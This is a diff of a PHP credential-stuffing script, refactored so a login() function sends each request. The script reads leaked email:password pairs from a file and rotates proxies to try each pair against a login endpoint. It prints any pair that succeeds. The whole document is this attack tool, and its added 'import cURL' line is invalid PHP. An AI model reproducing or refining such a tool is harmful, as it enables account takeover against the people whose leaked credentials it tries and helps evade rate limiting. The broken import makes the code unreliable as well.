@@ -1,19 +1,9 @@
 <?php
-// Open the list of passwords
-$file = fopen("passwords.txt", "r");
+// Import library cURL
+import cURL
 
-// Open the list of proxies
-$proxies = fopen("proxies.txt", "r");
-
-// Loop through the list of passwords
-while(!feof($file)) {
-    // Get the next password
-    $line = trim(fgets($file));
-    //split the line with :
-    list($email, $password) = explode(':', $line);
-    // Get the next proxy
-    $proxy = trim(fgets($proxies));
-
+// Fungsi login
+function login($email, $password, $proxy) {
     // Set up cURL
     $curl = curl_init();
     curl_setopt_array($curl, array(
@@ -31,17 +21,30 @@ while(!feof($file)) {
         ),
         CURLOPT_PROXY => $proxy,
     ));
-
     // Send the request and save the response
     $response = curl_exec($curl);
     $err = curl_error($curl);
-
     // Close cURL
     curl_close($curl);
-
     // Decode the JSON response
     $data = json_decode($response);
+    return $data;
+}
 
+// Open the list of passwords
+$file = fopen("passwords.txt", "r");
+// Open the list of proxies
+$proxies = fopen("proxies.txt", "r");
+// Loop through the list of passwords
+while(!feof($file)) {
+    // Get the next password
+    $line = trim(fgets($file));
+    //split the line with :
+    list($email, $password) = explode(':', $line);
+    // Get the next proxy
+    $proxy = trim(fgets($proxies));
+    // Send login request
+    $data = login($email, $password, $proxy);
     // Check if the login was successful
     if ($data->status == "success") {
         echo "Found a match: $email:$password";
@@ -51,4 +54,4 @@ while(!feof($file)) {
     }
 }
 fclose($file);
-fclose($pro
+fclose($proxies);
